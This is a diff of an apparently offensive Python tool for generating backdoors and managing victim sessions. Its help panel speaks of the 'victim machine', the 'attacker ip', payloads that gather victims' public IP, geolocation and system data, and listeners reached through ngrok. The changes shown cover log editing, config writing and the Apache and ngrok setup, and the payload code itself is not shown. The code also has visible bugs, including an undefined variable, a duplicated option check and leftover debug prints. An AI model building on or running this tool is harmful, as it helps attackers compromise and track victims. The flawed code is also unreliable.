@@ -1,8 +1,8 @@
 #!/bin/python3
-
 import random as r
 import subprocess
 import requests
+import optparse
 import json
 import os
 
@@ -14,7 +14,7 @@ def banner():
     print("▕     ╲╲  ╱ _  ╲╲    ▕ ▏   ▏ ▏▏ ▕     ╲╲  ▕    o ▏▏     ▏   ▏▏")
     print("▕     ╱╱ ╱ ╱_̲╲  ╲╲   ▕ ▏_̲ ╱ ╱╱  ▕     ╱╱  ▕      ▏▏     ▏   ▏▏")
     print("▕_̲ _̲ ╱╱ ╱        ╲╲  ▕_____╱╱   ▕____╱╱   ▕______▏▏     ▏_̲ _▏▏\n")
-    
+
 
 # Commands
 def generate_bd():
@@ -114,9 +114,6 @@ def mod_log():
             if "--remove" in arg: id = arg.split(arg[8])[1]
             else: id = arg.split(arg[2])[1]
             remove_session(id)
-        elif "-c" in arg:
-            with open("logs/sessions.json", "w") as sesF: sesF.write(""); sesF.close(); os.system('clear'); banner()
-            print("[+] Data deleted successfully. ")
         elif "-gc" in arg:
             if "--geo" in arg: id = arg.split(arg[5])[1]
             else: id = arg.split(arg[3])[1]
@@ -132,35 +129,14 @@ def mod_log():
         elif "-gm" in arg:
             if "--geo-mod" in arg: id = arg.split(arg[9])[1]
             else: id = arg.split(arg[3])[1]
-            for pars in range(2, len(args)):
-                if ":" in args[pars]: field = args[pars].split(":")[0]; value = args[pars].split(":")[1]
-                elif "=" in args[pars]: field = args[pars].split("=")[0]; value = args[pars].split("=")[1]
-                else : print("[-] Unexpected value in : "+args[pars])
-                with open("logs/geo.json", "r") as geoF:
-                    oldData = geoF.read() 
-                    sessData = oldData
-                    lista = sessData.replace("[","").replace("]","").replace(",{",",{{").split(",{")
-                    sessData = []
-                    for arg in lista:
-                        print(arg)
-                        print(type(arg))
-                        print(sessData)
-                        #sessData.append(json.loads(arg))
-                    for sess in sessData:
-                        if sess['sess_id'] == id:
-                            remove_geo(id)
-                            if field == "country": 
-                                with open("logs/geo.json", "w") as geof: geof.write(oldData[:-1]+'\n,\n{\n    "sess_id":"'+sess["sess_id"]+'",\n    "country":"'+value+'",\n    "iso":"'+sess["iso"]+'",\n    "latitude":"'+sess["latitude"]+'",\n    "longitude":"'+sess["longitude"]+'"\n}\n]')
-                            elif field == "iso": 
-                                with open("logs/geo.json", "w") as geof: geof.write(oldData[:-1]+'\n,\n{\n    "sess_id":"'+sess["sess_id"]+'",\n    "country":"'+sess["country"]+'",\n    "iso":"'+value+'",\n    "latitude":"'+sess["latitude"]+'",\n    "longitude":"'+sess["longitude"]+'"\n}\n]')
-                            elif field == "latitude": 
-                                with open("logs/geo.json", "w") as geof: geof.write(oldData[:-1]+'\n,\n{\n    "sess_id":"'+sess["sess_id"]+'",\n    "country":"'+sess["country"]+'",\n    "iso":"'+sess["iso"]+'",\n    "latitude":"'+value+'",\n    "longitude":"'+sess["longitude"]+'"\n}\n]')
-                            elif field == "longitude": 
-                                with open("logs/geo.json", "w") as geof: geof.write(oldData[:-1]+'\n,\n{\n    "sess_id":"'+sess["sess_id"]+'",\n    "country":"'+sess["country"]+'",\n    "iso":"'+sess["iso"]+'",\n    "latitude":"'+sess["latitude"]+'",\n    "longitude":"'+value+'"\n}\n]')
-                            else: print("[-] Err : field on geo data don´t exist. Please read the README.md for more info.")
-                        os.system('clear')
-                        banner()
-                        print(f"[+] {field} updated successfully")
+            Nid = args[args.index(arg)+1]
+            remove_geo(id)
+            with open("logs/geo.json", "r") as gFOld: oldData = gFOld.read(); gFOld.close()
+            with open("logs/geo.json", "w") as geoF: geoF.write(oldData[:-1]+'[\n{\n    "sess_id":"'+Nid+'",\n    "country":"'+data["timezone"].split('/')[1]+'",\n    "iso":"'+data["country"]+'",\n    "latitude":"'+data["loc"].split(",")[0]+'",\n    "longitude":"'+data["loc"].split(",")[1]+'"\n}\n]'); geoF.close()
+                    
+        elif "-c" in arg:
+            with open("logs/sessions.json", "w") as sesF: sesF.write(""); sesF.close(); os.system('clear'); banner()
+            print("[+] Data deleted successfully. ")
 
 def start_ses():
     ses = ""
@@ -221,8 +197,7 @@ def show_info():
         print("Dictionary : "+config["dictionary"])
     else: print("[-] Err: Parameter missing.")
 
-def mod_config():
-    args = action
+def mod_config(args):
     for arg in args:
         with open("config.json", "r") as configF:
             conf = json.loads(configF.read())
@@ -230,35 +205,45 @@ def mod_config():
         if "-i" in arg:
             if "--interface" in arg: interface = arg.split(arg[11])[1]
             else: interface = arg.split(arg[2])[1]
-            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+interface+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'"\n}'); confF.close()
+            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+interface+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
         if "-p" in arg:
             if "--packages" in arg: packages = arg.split(arg[10])[1]
             else: packages = arg.split(arg[2])[1]
-            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+packages+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'"\n}'); confF.close()
+            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+packages+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
         if "-t" in arg:
             if "--token" in arg: token = arg.split(arg[7])[1]
             else: token = arg.split(arg[2])[1]
-            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+token+'",\n    "dictionary":"'+conf["dictionary"]+'"\n}'); confF.close()
+            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+token+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
         if "-d" in arg:
             if "--dictionary" in arg: dictionary = arg.split(arg[13])[1]
             else: dictionary = arg.split(arg[2])[1]
-            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+dictionary+'"\n}'); confF.close()
+            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+dictionary+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
+        if "-p" in arg:
+            if "--path" in arg: path = arg.split(arg[6])[1]
+            else: path = arg.split(arg[2])[1]
+            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+path+'"\n}'); confF.close()
     print("[+] Config updated succesfully")
 
 def help_panel():
     print("Commands : \n")
     print("generate/gen\n      -os                 This designate operating system of the victim machine : windows/linux\n      -lip                This parameter set attacker ip manually : 10.0.0.15\n      -t                  This designate the type of attack : simple/global  ¡¡global tokens are avaible on our discord server!!\n      -T                  If want start listen just after of execution or want store session : start/store\n")
     print("payloads/pay\n      -ip                 Send request using api's for get public ip and geolocation of victim machine\n      -os                 Obtain system information")
-    print("log\n      -m/--mod            Modify data stored from sessions : -m:<id> ip=10.0.0.2\n      -r/--remove         Remove specified session from log : -r=<id>\n      -c/--clean          Delete all data from sessions log\n      -g/--geo            create geolocation log : -g=<id> ip:<public ip>\n      -gm/--geo-mod       Modify geolocation data of a session")
+    print("log\n      -m/--mod            Modify data stored from sessions : -m:<id> ip=10.0.0.2\n      -r/--remove         Remove specified session from log : -r=<id>\n      -c/--clean          Delete all data from sessions log\n      -gc/--geo            create geolocation log : -gc=<id> ip:<public ip>\n      -gm/--geo-mod       Modify geolocation data of a session")
     print("start\n      -s/--session        Use for start a stored session using id : -s:<id>\n      -l/--listen         Use for start listen on a port : -l=2925\n")
     print("show\n      -s/--sessions       Show all sessions stored\n      -g/--geo            Show geographic information about sessions\n      -c/--config         Use for display config\n")
     print("config\n      -i/--interface      Config network interface\n      -p/--packages       Config the amount of packages received\n      -t/--token          Set or add token of ngrok\n      -d/--dictionary     Modify the parameters for create session id\n")
 
-
 # Functions
 
 def setup():
-    os.system('service apache2')
+    with open("config.json", "r") as cFile: config = json.loads(cFile.read()); cFile.close()
+    out = str(subprocess.check_output("ps aux | grep apache2", shell=True))
+    if "www-data" not in out: os.system('service apache2 start'); print("[*] Apache Server is Started.")
+    else: print("[*] Apache server is start")
+    if not os.path.exists("/root/.config/ngrok/ngrok.yml"):
+        if config["token"] != "": print("[*] Configurando ngrok..."); os.system(f'wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -O /root/ngrok.tgz -o /root/out && rm /root/out && tar -xf /root/ngrok.tgz && chmod +x /root/ngrok && /root/./ngrok config add-authtoken {config["token"]}'); print("[+] Ngrok configured succesfully")
+        else: print("[!] Ngrok not configured")
+    else: print("[*] Ngrok is active") 
 
 def make_id():
     id = ""
@@ -316,6 +301,7 @@ def remove_geo(id):
         sessData = sesF.read()
         lista = sessData.replace("[","").replace("]","").split(",")
         sessData = []
+        print(lista)
         for arg in lista:
             sessData.append(json.loads(arg))
         for session in sessData:
@@ -332,10 +318,9 @@ def remove_geo(id):
     banner()
     print("[+] Session removed successfully")
 
-
 # Interpreter
-setup()
 banner()
+setup()
 while True:
     with open("config.json", "r") as cFile:
         config = json.loads(cFile.read())
@@ -357,10 +342,12 @@ while True:
                 if len(action) > 1: show_info()
                 else: print("[-] Parameter Missing. Use h or help for help panel")
             elif action[0] == "config":
-                if len(action) > 1 and action[1] !="" : mod_config()
+                if len(action) > 1 and action[1] !="" : mod_config(action)
                 else: print("[-] Parameter Missing. Use h or help for help panel")
             elif action[0] == "clear":
                 os.system('clear'); banner()
+            elif action[0] == "rem":
+                remove_geo("123")
     except KeyboardInterrupt:
         close_vrf = input("\nQuiere salir del programa? [Y/n] > ")
         if close_vrf != "n" and close_vrf != "N":
